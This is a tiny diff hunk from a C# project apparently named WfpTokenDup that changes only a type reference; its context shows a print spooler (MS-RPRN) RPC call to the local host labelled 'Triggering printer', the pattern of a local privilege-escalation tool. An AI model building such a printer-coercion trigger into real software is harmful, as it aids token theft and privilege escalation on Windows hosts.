@@ -261,7 +261,7 @@ namespace WfpTokenDup.Library
                 using (var rpc = new MsRprn())
                 {
                     var printerName = @"\\127.0.0.1";
-                    var devmodeContainer = new RpcLibrary.Interop.DEVMODE_CONTAINER();
+                    var devmodeContainer = new DEVMODE_CONTAINER();
 
                     Console.WriteLine("[>] Triggering printer.");
 
